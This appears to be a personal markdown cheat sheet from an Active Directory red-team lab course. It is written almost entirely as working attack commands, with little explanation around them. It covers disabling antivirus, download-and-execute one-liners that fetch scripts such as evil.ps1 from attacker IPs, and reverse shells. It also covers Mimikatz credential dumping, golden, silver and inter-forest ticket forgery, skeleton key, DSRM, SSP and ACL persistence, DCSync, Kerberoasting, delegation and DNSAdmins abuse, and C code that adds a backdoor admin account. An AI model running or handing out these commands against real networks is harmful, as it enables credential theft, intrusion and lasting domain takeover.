# Powershell

## General/Troubleshooting
* `$PSVersionTable`
* Inexplicable failure? Try `-Verbose`
* `Get-Member` to investigate object structures
* `. .\PowerUp.ps1` loads file and makes its functions available in current scope
* `$ExecutionContext.SessionState.LanguageMode` -> FullLanguage or ConstrainedLanguage. In constrained mode, many features are restricted. No COM obj, limited .NET types, etc). Can overcome this by starting shell as SYSTEM (`psexec -s`) if you are local admin `.\PsExec.exe \\dcorp-adminsrv -s powershell` Note: Can also run programs blocked by GPO (eg `mimikatz.exe`)when in SYSTEM shell 
* Avoid AV 
  * `Set-MpPreference -DisableIOAVProtection $true`
  * `Set-MpPreference -DisableRealtimeMonitoring $true`
* Interact with Registry
  * `Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"`
  * `Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2`
  * `New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD`
* Run command in background (like bash `&`)
  * `Start-Job -ScriptBlock { . C:\AD\Tools\Invoke-PowerShellTcp.ps1; Invoke-PowerShellTcp -Reverse 127.0.0.1 -Port 3333}`
  * NB `Start-Job` spawns a semi-separate session. Must use full paths, import libraries even if they are already in current session. **Job will die when powershell window is closed**.
  * `Start-Process powershell.exe  "-c",". c:\ad\tools\Invoke-PowerShellTcp.ps1; Invoke-PowerShellTcp -Reverse 127.0.0.1 -Port 3333" -WindowStyle hidden` **Process survives closing of current powershell window**
<hr/>

## Download and execute
```powershell
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1') 
```
```powershell
# NB IE-based method is futzy - IE COM object members seem to depend on IE version...
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1 ');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
```
```powershell
# Works with IE11
$ie=New-Object -ComObject InternetExplorer.Application; $ie.visible=$False; $ie.navigate('http://192.168.231.1/test.ps1');sleep 5;
$response = ($ie.Application.document.getElementsByTagName('body') | select innerText);
$ie.quit(); iex $response.innerText;
```
```powershell
iex (iwr 'http://192.168.230.1/evil.ps1')  # PSv3 onwards
```
```powershell
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex $h.responseText
```
```powershell
$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
iex ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```
```powershell
iex(gc -raw \\172.16.100.32\share\callme.ps1)
```
```powershell
.\PsExec64.exe -accepteula -s \\dcorp-dc powershell -exec bypass -c "iex(gc -raw \\172.16.100.32\share\callme.ps1)"
.\PsExec64.exe -accepteula -s \\dcorp-dc powershell -exec bypass -c "iex(iwr -usebasicparsing http://172.16.100.32/AD/Tools/Invoke-Mimikatz.ps1);Invoke-Mimikatz;"
# NB -i psexec param for remote machine means interact with session on specified machine, not local machine (so can't do PsExec.exe -i \\dcorp-dc powershell to get interactive shell)
```
```powershell
# Listener for payloads
. .\powercat.ps1
powercat -l -v -p 443 -t 1000
```
<hr/>

## User Manipulation
* Reset Password: `Get-ADUser student32 | Set-ADAccountPassword -Reset -NewPassword $(ConvertTo-SecureString -AsPlainText "potato3$" -force)`

<hr/>

## Domain Enumeration
```powershell
$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
$ADClass::GetCurrentDomain()
```
### Domain Enumeration - Tools
* **PowerSploit PowerView.ps1** (often flagged by AV)
  * Note: when no `-Domain` param is set, will use current domain
  * `Import-Module "C:\AD\Tools\PowerView.ps1"` or `iex(iwr http://172.16.99.32/PowerView.ps1)`
  * `Get-NetDomain -Domain moneycorp.local`
  * `Get-DomainPolicy -domain moneycorp.local`
  * `(Get-DomainPolicy -domain dollarcorp.moneycorp.local)."system access"` and `."kerberos policy"`
  * `Get-NetDomainController` / `Get-NetDomainController -domain moneycorp.local`
  * `Get-NetUser` / `Get-NetUser –Username student1`
  * `Get-NetComputer` / `Get-NetComputer –OperatingSystem "*Server 2016*"`
  * `Get-NetComputer -Ping` / `Get-NetComputer -FullData`
  * `Get-NetGroup *admin* `
  * `Get-NetGroupMember -GroupName "Domain Admins" -Recurse` ; `Get-NetGroupMember -GroupName "Enterprise Admins" -Domain moneycorp.local`
  * `Get-NetGroup -UserName "jsmith"`
  * `Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroup`
  * `Invoke-ShareFinder` / `Invoke-FileFinder` / `Get-NetFileServer` / `Invoke-ShareFinder -ExcludeStandard -ExcludeIPC -ExcludePrint`
  * `Get-UserProperty -Properties pwdlastset,badpwdcount,logoncount` Help to detect decoy/canary accounts
  * `Find-UserField -SearchField Description -SearchTerm "built"`
  * `Get-NetLoggedon -ComputerName dcorp-dc.dollarcorp.moneycorp.local`
  * `Get-LoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local`
  * `Get-LastLoggedOn -ComputerName dcorp-dc.dollarcorp.moneycorp.local`
  * `Get-NetGPO` / `Get-NetGPO -ComputerName dcorp-dc.dollarcorp.moneycorp.local`
  * `Find-GPOComputerAdmin` / `Find-GPOLocation -UserName student32 -Verbose`
  * `Get-NetOU -FullData` and `Get-NetGPO -GPOname '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'` - Find OUs, then find info about the GPOs that apply to them
  * `Get-NetComputer -FullData | ? { $_.adspath -like "*studentmachines*" }` - Find computers in specified OU
  * `Get-ObjectAcl -SamAccountName student32 -ResolveGUIDs`
  * `Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose`
  * `Invoke-ACLScanner -ResolveGUIDs` Search for interesting ACEs
  * `Get-ObjectAcl -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose`
  * `Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"`
  * `Get-NetDomainTrust` /  `Get-NetDomainTrust -Domain us.dollarcorp.moneycorp.local`
  * `Get-NetForestDomain` / `Get-NetForestDomain -Forest eurocorp.local`
  * `Get-NetForestCatalog` / `Get-NetForestTrust`
  * `Find-LocalAdminAccess` 📣 - calls `Invoke-CheckLocalAdminAccess` on every machine
  * `Invoke-EnumerateLocalAdmin` 📣, `Invoke-UserHunter -GroupName RDPUsers -CheckAccess` 📣, `Invoke-UserHunter -stealth` (only checks high-value targets)
* **Microsoft AD Module** (From MS, rarely flagged by AV, works in 'constrained language mode') https://github.com/samratashok/ADModule
  * Note: when no `-Domain` param is set, will use current domain
  * `Import-Module "C:\tmp\ADModule-master\ADModule-master\Microsoft.ActiveDirectory.Management.dll"` (reqd)
  * `import-module "C:\tmp\ADModule-master\ADModule-master\ActiveDirectory\ActiveDirectory.psd1"` (optional)
  * `Get-Command -module activedirectory`
  * `Get-ADDomain -identity moneycorp.local`
  * `Get-ADDomainController` / `Get-ADDomainController -domain moneycorp.local -discover`
  * `Get-ADUser -Filter * -Properties *` / `Get-ADUser -Identity jsmith -Properties *`
  * `Get-ADUser -filter * -Properties name,badpwdcount,pwdlastset,logoncount,description | select name,badpwdcount,pwdlastset,logoncount,description | Format-Table` Help to detect decoy/canary accounts
  * `Get-ADComputer -Filter * | select Name`
  * `Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' `
  * `Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}`
  * `Get-ADComputer -Filter * -Properties *`
  * `Get-ADGroup -Filter 'Name -like "*admin*"' | select Name`
  * `Get-ADGroupMember -Identity "Domain Admins" -Recursive `
  * `Get-ADPrincipalGroupMembership -Identity jsmith`
  * `Get-ADUser -Filter 'Description -like "*built*"'`
  * `Get-ADOrganizationalUnit -filter * -Properties *`
  * `(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access`
  * `Get-ADTrust -Filter *` / `Get-ADTrust -Identity us.dollarcorp.moneycorp.local` 
  * `Get-ADForest` / `Get-ADForest -Identity eurocorp.local` / `(Get-ADForest).Domains`
  * `Get-ADForest | select -ExpandProperty GlobalCatalogs` / `* Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'`
  * `Get-ObjectAcl -DistinguishedName "CN=AdminSDHolder,CN=system,DC=moneycorp,DC=local" -Domain moneycorp.local `
* **Find-WMILocalAdminAccess** 📣 
* **BloodHound** 
  * Load Ingestor: `. .\BloodHound-master\Ingestors\SharpHound.ps1`
  * Run Ingestor:
    * `Invoke-BloodHound -CollectionMethod all` 📣
    * `Invoke-BloodHound -CollectionMethod all -ExcludeDC` Reduces risk of detection
    * `Invoke-BloodHound -CollectionMethod LoggedOn` 
  * Setup: `neo4j.bat install-service`, `neo4j.bat start`, `http://localhost:7474` to change default password, then run `BloodH ound.exe` and import data from ingestors.
  * *Interesting queries*: Domain Admins -> Sessions; Road Icon = pathfinding  
📣 = noisy

<hr/>

## Lateral Movement and Remote Control
* `Enter-PSSession -ComputerName dcorp-adminsrv` 
  * When connected, prompt becomes `[dcorp-adminsrv]: PS C:\Users\username\Documents>`
  * To enable on target: `Enable-PSRemoting`
* `Invoke-Command -ScriptBlock {Get-Process} -ComputerName (Get-Content list.txt)` Runs commands in parallel on all computers in list.txt (One-to-Many Remoting)
* `$sess = New-PSSession -ComputerName dcorp-adminsrv`
* `Invoke-Command -ScriptBlock {Get-Process} -Session $sess` When using a `-Session` parameter, state is preserved between commands (e.g. variables continue to exist, etc)
* `Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess`
* `Invoke-Command -FilePath C:\ad\tools\Invoke-Mimikatz.ps1 -Session $sess`

<hr/>

## Persistence

### Mimikatz
* Dump creds: `Invoke-Mimikatz` (runs default mimikatz cmd `sekurlsa::logonpasswords`)
* Export tickets `sekurlsa::tickets /export`
* Pass the Hash: `Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:5f4dcc3b5aa765d61d8327deb882cf99 /run:powershell.exe"'`
  * To evade some detection of PTH, include the other hash types as well as ntlm `/aes256:<hash> /aes128:<hash> /ntlm:</hash>`
* Golden Ticket
  * Execute mimikatz on DC as Domain Admin to get krbtgt hash `Invoke-Mimikatz -Command '"lsadump::lsa /patch"'` **OR** on any computer as Domain Admin to get krbtgt hash `Invoke-Mimikatz -command '"lsadump::dcsync /user:dcorp\krbtgt"'`
  * Now we can generate a Golden Ticket using this hash `Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211123506631-3219952063-538504511 /krbtgt:5f4dcc3b5aa765d61d8327deb882cf99 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'`   (use `Get-ADDomain` to get SID of domain). Instead of `/ptt` (injected in memory), can use `/ticket` to save to a file. This *may sometimes* help evade detection
  * Now we can access network services (eg use `ls`, `schtasks`, `PsExec` etc on remote machines as the user specified)
  * `klist` to view cached tickets  
  * To evade some detection, use `/aes256:<aes256keysofkrbtgt>`  
  * Golden ticket with SID history instead of group: 1. `kerberos::golden /user:administrator /domain:dollarcorp.moneycorp.local /krbtgt:<rc4 hash> /sid:<SID of dollarcorp domain (no RID)> /sids:<SID of EA group> /ticket:<filename>` 2. `kerberos::ptt <filename>` 3. `ls \\mcorp-dc.moneycorp.local\c$`
* Silver Ticket
  * Get DC's hash from domain controller `Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`
  * Generate Silver Ticket using this hash `Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:ced263f98377ccf165278ae2b549ddcd /User:Administrator /ptt"'` SID is domain SID without final RID portion
  * Now we can get code execution using schtasks and our HOST ticket: `schtasks /create /s dcorp-dc.dollarcorp.moneycorp.local /ru "NT AUTHORITY\SYSTEM" /sc weekly /tn "WindowsUpdater" /tr "powershell.exe -c 'iex((new-object net.webclient).downloadstring('''http://172.16.99.32/callme.ps1'''))'"` then `schtasks /S dcorp-dc.dollarcorp.moneycorp.local /run /tn windowsupdater`
  * Different services require different SPN ticket(s)
    * WMI -> HOST, RPCSS
    * WinRM -> HOST, HTTP 
    * PS Remoting -> HOST, HTTP (maybe also WSMAN, RPCSS)
    * schtasks -> HOST
    * Win File Share (CIFS) -> CIFS
    * LDAP -> LDAP
* Skeleton Key
  * `Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local`
  * Now it is possible to access any machine with a valid username and the password 'mimikatz'. For example, `Enter-PSSession -ComputerName dcorp-dc -Credential dcorp\Administrator` When prompted, enter `mimikatz` as password
  * Persists until lsass is restarted/DC is rebooted

### Persistence - Directory Services Restore Mode (DSRM)
* There is a local admin on every DC called 'Administrator' whose password is DSRM password (aka SafeModePassword). This password is required when a server is promoted to DC and is rarely changed. This user is not able to log on over the network.
* After altering the configuration of the DC, it is possible to pass the NTLM hash of this user to access the DC
* Persists a very long time, until this password is changed, which is almost never)
* As Domain Admin on DC, execute `Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'` to retrieve Administrator has from the SAM
* Before the hash can be used, Logon Behaviour for DSRM account needs to be created or changed: `New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD` or `Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2`
* Now we can access the DC in the future as this user: `Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86f /run:powershell.exe"'` Notice particularly the domain is the machine name
* In the resulting powershell session we can do things like `ls \\dcorp-dc\c$` or `C:\ad\external\PsExec64.exe \\dcorp-dc cmd` to get file and shell access
* Note this is a risky attack that degrades the security of the target.

### Persistence - Custom Security Support Provider (SSP)
* SSP - a DLL which provides ways for an application to obtain an authenticated connection. Some SSP packages from MS are NTLM, Kerberos, Wdigest, CredSSP
* Mimikatz provides a custom SSP - `mimilib.dll`. This SSP logs passwords in clear text on the target server
* Simple Way: `invoke-mimikatz -command '"misc::memssp"'` - No reboot required. BUT not entirely stable with Server 2016
* Harder Way
  * Drop mimilib.dll to system32
  * Add it to packages using ps (*not tested*)
     ```powershell
      $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
      $packages += "mimilib"
      Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages 
      Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
     ```
  * Then reboot
* Logons on the DC are logged to C:\Windows\system32\kiwissp.log
* Note this is a risky attack that degrades the security of the target. It is also very noisy.

### Persistence Using ACLs - AdminSDHolder
* AdminSDHolder - container used to control permissions using an ACL for certain built-in privileged groups (called Privileged Groups)
* Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL by the ACL of AdminSDHolder
* Protected Groups: Account Operators, Enterprise Admins, Backup Operators, Domain Controllers, Server Operators, Read-only Domain Controllers, Print Operators, Schema Admins, Domain Admins, Administrators, Replicator
* How to abuse certain protected groups:
  * Account Operators - can modify nested groups within DA/EA/BA
  * Backup Operators - backup GPO, edit to add SID of controlled account to privileged group and Restore
  * Server Operators - run a command as system (using disabled Browser service)
  * Print Operators - copy ntds.dit backup, load device drivers
* This AdminSDHolder ACL can be abused. If we add privileges for an account we control to this ACL, they will propagate to the ACLs for all these Privileged Groups automatically (or when we trigger it).  (*must be DA to grant the rights*)
* PowerView `Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student1 -Rights All -Verbose`
* ADModule `Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -Verbose`
* Then trigger the propagation immediately using `Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose`

### DCSync
* To be more stealthy, grant rights to user account to DCSync, then we can get krbtgt hash at any time (*must be DA to grant the rights*)
  * PowerView `Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student1 -Rights DCSync -Verbose`
  * ADModule `Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -GUIDRight DCSync -Verbose`
  * Then get the krbtgt hash at any time with `Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`

### Persistence Using ACLs - Security Descriptors
* Modify Security Descriptors (eg Owner, primary group, DACL, SACL) of multiple remote access methods to allow access to non-admin users
* Security Descriptor Definition Language (SDDL) - format used to describe a security descriptor. Uses ACE strings for DACL and SACL:
  * ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid 
  * ACE for built-in admins for WMI namespaces: `A;CI;CCDCLCSWRPWPRCWD;;;SID`. Replacing SID with the SID of our account, we get full ACL access for that namespace
* Set-RemoteWMI.ps1 `Set-RemoteWMI -UserName student1` or for remote machine: `Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' ` (`-Remove` to clean up)
* Set-RemotePSRemoting.ps1 `Set-RemotePSRemoting -UserName student1` or for remote machine: `Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc ` (*Note: Even if there are IO or other errors, the command may still have worked.*) To remove: `Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc -Remove` 
* **Discretionary ACL Modification Project (DAMP)** - Persistence Through Host-based Security Descriptor Modification
  * **NOTE**: Fix in *RemoteHashRetrieval.ps1* - rename variable `$IV` to `$InitVector` (Find+Replace works)
  * `Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose`
  * `Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose`
  * `Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose`
  * `Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose`


<hr/>

## Privilege Escalation

### Local PrivEsc
* PowerSploit PowerUp
  * `Invoke-AllChecks`
  * Exploitable Service Configurations
    * `Get-ServiceUnquoted`
      * C:\WebServer\Abyss Web Server\WebServer\abyssws.exe
      * `Write-ServiceBinary -Name 'AbyssWebServer' -Path c:\webserver\Abyss.exe`
    * `Get-ModifiableServiceFile`
    * `Get-ModifiableService` 
      * `Invoke-ServiceAbuse -Name 'AbyssWebServer'`

#### Local PrivEsc - Replace Service Binary
```c
//i686-w64-mingw32-gcc adduser.c -o adduser.exe
#include <windows.h>

void main(){
    system("cmd /c net user hack potatoPOTATO3$ /add");
    system("cmd /c net localgroup Administrators hack /add");
    system("cmd /c net localgroup \"Remote Desktop Users\" hack /add");
}
```

### Domain PrivEsc
**NOTE: When messing with tickets, ACLs, etc, may need to logoff/logon, or do it a few times, or reboot for changes to take effect**

#### Privilege Escalation - Kerberoast
* Save TGS and bruteforce it offline. 
* The TGS has a server portion encrypted with the password hash of the service account.
* These hashes can then be used to create Silver Tickets
* Quite discreet/stealthy 
* *BUT*: Machine Service Accounts typically have very long, complex passwords difficult to bruteforce. Therefore, we will target user accounts that are being used as service accounts
  * `Get-NetUser -SPN` (PowerView)
  * `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` (AD Module)
* Request TGS
  * `Request-SPNTicket -SPN MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local` (PowerView)
  * `Add-Type -AssemblyName System.IdentityModel` <br/>
    `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"` (Raw PS)
  * `klist` to verify
* Dump tickets with mimikatz `Invoke-Mimikatz -Command '"kerberos::list /export"'` - outputs `.kirbi` files to current dir
* Crack hash: `python .\tgsrepcrack.py .\10k-worst-pass.txt C:\ad\1-40a10000-Administrator@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi`

#### Privilege Escalation - Kerberoast: Targeted Kerberoasting - Kerberos Preauth Disabled
* If Kerberos Preauth is disabled, it is possible to grab a user's crackable AS-REP and bruteforce it offline without having access to the user account
* Enumerating such accounts
  * `Get-DomainUser -PreauthNotRequired -Verbose` (PowerView - dev)
  * `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth` (AD Module)
* Force disable preauth (if you have sufficient rights) (PowerView)
  1. Identify those accounts to which you have sufficient rights to disable preatuh: `Invoke-ACLScanner -ResolveGUIDs | ? {$_.IdentityReferenceName -match "RDPUsers"}`
  1. Disable Preauth: `Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose`
  1. Enumerate again to check that the change has taken place
* Request encrypted AS-REP for offline bruting (ASREPRoast)
  * `Get-ASREPHash -UserName VPN1user -Verbose`
  * Enumerate all users with kerberos preauth disabled and request hashes: `Invoke-ASREPRoast -Verbose`
* Crack hashes with john or hashcat

#### Privilege Escalation - Kerberoast: Targeted Kerberoasting - Set SPN
* With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the forest)
* Then, we can request a TGS without any special privs. The TGS can then be Kerberoasted. It doesn't matter if there's actually a service running, or if the SPN makes any sense at all.
1. Enumerate users to which we have the required rights `Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}` (PowerView)
2. See if the user already has an SPN
    * `Get-DomainUser -Identity supportuser | select serviceprincipalname` (PowerView)
    * `Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName`
(AD Module)
3. Set SPN for user (must be unique in domain)
    * `Set-DomainObject -Identity support1user -Set @{serviceprincipalname='ops/whatever1'}` (PowerView)
    * `Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='ops/whatever1'}` (AD Module)
4. Request ticket
    * `Request-SPNTicket -SPN "ops/whatever1"` (PowerView)
    * `Add-Type -AssemblyName System.IdentityModel` <br/>
     `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"` (AD Module)
    * `klist` to verify
5. Export ticket `Invoke-Mimikatz -Command '"kerberos::list /export"'`
6. Crack password

#### Privilege Escalation - Kerberos Delegation
* Basic example: allows web server to make requests to DB server as the logged-in user.
  * user sends TGT with (web) TGS to web server. TGT is embedded in TGS when service has unconstrained delegation enabled
  * web server uses user's TGT to request a TGS for the DB server from the DC
  * web server connects to DB server as the user
* Accounts can be marked 'sensitive' and cannot be delegated - typically Privileged Accounts
* Types:
  * **Unconstrained Delegation (aka General or Basic Delegation)** - allows the first hop server (web in our example) to request access to any service on any computer in the domain
    * When set for a service account, allows delegation to any service or any resource on the domain as a user
    * When enabled, DC places user's TGT inside TGS. When presented to the server with unconstrained delegation, TGT is extracted from TGS and stored in LSASS. Server can now reuse TGT to access any other resource as the user
    * Can therefore escalate privileges if we get Local Admin on a computer with unconstrained delegation and a DA connects to the machine.
    1. Discover computers with unconstrained delegation:
      * `Get-NetComputer -Unconstrained` (PowerView)
      * `Get-ADComputer -Filter {TrustedForDelegation -eq $True}` <br/> `Get-ADUser -Filter {TrustedForDelegation -eq $True}` (AD Module)
      * NB: DCs always show up as unconstrained - ignore them
    1. Compromise the server(s) where unconstrained delegation is enabled
    1. Check if DA token is available and export
      * `Invoke-Mimikatz -Command '"sekurlsa::tickets"'` <br/> `Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'`
    1. Reuse DA token 
      * `Invoke-Mimikatz -Command '"kerberos::ptt C:\path\file.kirbi"`
  * **Constrained Delegation** - allows the first hop server to request access to only specified services on specified computers.
    * Service for User (S4U) extension used to impersonate the user
      * Service for User to Self (S4U2self) - allow service to obtain forwardable TGS to itself on behalf of user (e.g. Non-Kerberos authentication to Kerberos Authentication). Service account must have the *TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION – T2A4D UserAccountControl* attribute
      * Service for User to Proxy (S4U2proxy) - allow service to obtain TGS to a 2nd service on behalf of user. *msDS-AllowedToDelegateTo* attribute of the service account contains a list of SPNs to which the user tokens can be forwarded.
    * To exploit: if we have access to such a service account (say websvc), we can then access any of the services listed in the *msDS-AllowedToDelegateTo* attribute as *ANY* user
    1. Enumerate users and computers with constrained delegation enabled, and the SPNs that can be delegated to
      * `Get-DomainUser -TrustedToAuth` <br/> `Get-DomainComputer -TrustedToAuth` (PowerView - dev)
      * `Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo` (AD Module)
    1. Request TGT using *kekeo*: `tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887ea6666666666666666` This stores ticket in a file.
    1. Request TGS using *kekeo*: `tgs::s4u /tgt:filename.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local`
    1. Inject TGS using *mimikatz*: `Invoke-Mimikatz -Command '"kerberos::ptt filename.kirbi"`
    1. Now we can access the share `\\dcorp-mssql.dollarcorp.moneycorp.local\c$` as if we were `dcorp\Administrator`
    * NB: Kerberos delegation occurs for any service running under the same service account, not just the specified service. No validation on specified SPN. This means we can get a TGS for any such service using *kekeo*, separating services with a `|`: `tgs::s4u /tgt:filename.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL` With LDAP access, we can run dcsync to access secrets on the DC without compromising the DA account itself: `Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'` 

#### Privilege Escalation - DNS Admin to Domain Admin
* DNSAdmins group can load arbitrary DLL with privileges of dns.exe (SYSTEM)
* If the DC is the DNS server, this escalates us to DA
* Need privileges to restart DNS service
1. Enumerate DNSAdmins 
  * `Get-NetGroupMember -GroupName "DNSAdmins"` (PowerView)
  * `Get-ADGroupMember -Identity DNSAdmins` (AD Module)
1. Compromise a a member of DNSAdmins group
1. Configure DLL
  * `dnscmd dcorp-dc /config /serverlevelplugindll \\172.16.100.12\dll\mimilib.dll`
  * `$dnsettings = Get-DnsServerSetting -ComputerName dcorp-dc Verbose -All` <br/>
  `$dnsettings.ServerLevelPluginDll = "\\172.16.100.12\dll\mimilib.dll"` <br/>
  `Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose`
1. Restart DNS servce `sc \\dcorp-dc stop dns`, `sc \\dcorp-dc start dns`. By default, mimilib.dll in this context will log all DNS queries to `C:\Windows\System32\kiwidns.log`. DLL can be replaced with one that opens a reverse shell, adds a user, etc.

#### Privilege Escalation - Domain Admin to Enterprise Admin
* Child Domain to Forest Root using Trust Tickets
   * Get trust key: `Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc` or `Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'` (where mcorp represents the parent domain)
   * Forge inter-realm TGT: `Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<SID of current domain> /sids:<SID of EA group of parent domain> /rc4:<rc4 of trust key> /service:krbtgt /target:<fqdn of parent domain> /ticket:C:\path\trust_tkt.kirbi"' `
   * Get TGS for service in target domain using the forged trust ticket: `kekeo_old\asktgs.exe C:\path\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local ` (can also create for HOST, RPCSS, WMI,etc)
   * Use TGS to access targeted service `.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi` (*may need to run multiple times*) <br/> 
   then try to access service `ls \\mcorp-dc.moneycorp.local\c$`
* Child Domain to Parent Domain using krbtgt hash
   * Get trust key: `Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`
   * Forge inter-realm TGT: `Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<SID of current domain> /sids:<SID of EA group of parent domain> /krbtgt:<krbtgt hash> /ticket:C:\path\krbtgt_tkt.kirbi"' `
   * Use PTT to gain access to services `Invoke-Mimikatz -Command '"kerberos::ptt C:\path\krbtgt_tkt.kirbi"`, then eg `ls \\mcorp-dc.moneycorp.local\c$`


### Abusing Cross-Forest Trusts

#### Trust Abuse Across Forest
* Request inter-forest trust key as Domain Admin `Invoke-Mimikatz -ComputerName dcorp-dc '"lsadump::trust /patch"'`
* Forge inter-forest TGT `invoke-mimikatz -command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local  /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:aae3f153a4140c0f171702ca5d85d5b8 /service:krbtgt /target:eurocorp.local /ticket:c:\tmp\forest_trust.kirbi"'` (SID of current domain  - `dollarcorp.moneycorp.local` in this example; rc4 of `[  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL`)
* Get TGS `.\kekeo_old\asktgs.exe C:\tmp\forest_trust.kirbi CIFS/eurocorp-dc.eurocorp.local`
* Inject TGS `C:\ad\tools\kekeo_old\kirbikator.exe lsa C:\ad\tools\CIFS.eurocorp-dc.eurocorp.local.kirbi`
